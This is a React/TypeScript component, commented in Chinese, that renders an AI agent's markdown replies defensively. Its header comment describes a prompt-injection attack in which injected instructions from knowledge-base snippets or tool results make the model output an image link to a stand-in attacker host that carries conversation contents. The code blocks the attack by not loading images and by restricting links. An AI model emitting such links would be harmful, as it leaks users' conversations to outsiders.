/**
 * Agent 回覆的 markdown 渲染。
 *
 * 回覆內容受知識庫片段、MCP 工具結果影響，屬不可信輸入。若照 react-markdown 預設渲染，
 * 被注入的指令只要讓模型輸出 `![](https://attacker/?d=<對話內容>)`，瀏覽器顯示訊息當下
 * 就會自動發出請求把資料帶走，使用者什麼都不用點。因此：
 *   - 圖片一律不載入，只留 alt 文字（含參照式圖片，兩者渲染時都是 img 元素）
 *   - 連結只放行 http(s)/mailto，其餘降為純文字；開新分頁且不帶 referrer／opener
 *   - 不掛 rehype-raw：原始 HTML 維持以文字呈現
 */
import type { ReactNode } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

const SAFE_LINK = /^(https?:|mailto:)/i;

const components: Components = {
  img: ({ alt }) => (alt ? <span className="md-img-alt">{alt}</span> : null),
  a: ({ href, children }) =>
    href && SAFE_LINK.test(href) ? (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
};

export function SafeMarkdown({ children }: { children: string }): ReactNode {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
      {children}
    </ReactMarkdown>
  );
}
